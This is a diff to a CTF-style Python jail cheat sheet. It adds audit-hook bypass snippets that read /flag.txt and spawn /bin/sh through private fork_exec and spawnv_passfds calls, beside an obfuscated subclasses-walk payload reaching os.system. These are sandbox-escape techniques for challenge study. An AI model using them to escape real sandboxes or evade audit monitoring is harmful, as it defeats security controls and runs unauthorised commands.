@@ -1,6 +1,6 @@
 ---
-title: 'Pyjail Cheat Sheet'
-date: '2024-06-26'
+title: 'Pyjail Cheatsheet'
+date: '2024-07-22'
 category: 'cheatsheet'
 description: ""
 tags:
@@ -155,6 +155,34 @@ class cobj:...
 obj = cobj()
 
 [d:=[]._＿doc＿_,o:=d[32],s:=d[17],h:=d[54],[obj[s+h] for obj._＿class＿_._＿getitem＿_ in [[obj[o+s] for obj._＿class＿_._＿getitem＿_ in [[+obj for obj._＿class＿_._＿pos＿_ in [[]._＿class＿_._＿mro＿_[1]._＿subclasses＿_]][0][104].load_module]][0].system]]]
+```
+
+### audithook bypass
+```py
+import sys, os
+sys.addaudithook((lambda x: lambda *_: x(1))(os._exit))
+# Note that most of the imports below would trigger the audit event if not already imported before setting up the audithook, see: https://github.com/python/cpython/issues/116840
+```
+```py
+# https://ur4ndom.dev/posts/2024-02-11-dicectf-quals-diligent-auditor/#fnref5
+# https://github.com/python/cpython/issues/115322
+import readline
+readline.read_history_file("/flag.txt")
+print(readline.get_history_item(1))
+
+import _posixsubprocess # python 3.10, may differ in other versions
+errpipe_read, errpipe_write = os.pipe()
+_posixsubprocess.fork_exec(["/bin/sh", "-c", "cat /flag.txt"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, errpipe_read, errpipe_write, False, False, None, None, None, -1, None)
+
+import subprocess # python 3.10, may differ in other versions
+errpipe_read, errpipe_write = os.pipe()
+subprocess._posixsubprocess.fork_exec(["/bin/sh", "-c", "cat /flag.txt"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, errpipe_read, errpipe_write, False, False, None, None, None, -1, None)
+
+import multiprocessing.util # underlying uses _posixsubprocess
+multiprocessing.util.spawnv_passfds(b"/bin/sh", ["/bin/sh", "-c", "cat /flag.txt"], [])
+
+# More techniques at https://github.com/Nambers/python-audit_hook_head_finder
+# + https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202024/calc
 ```
 
 ### assigning attributes and variables
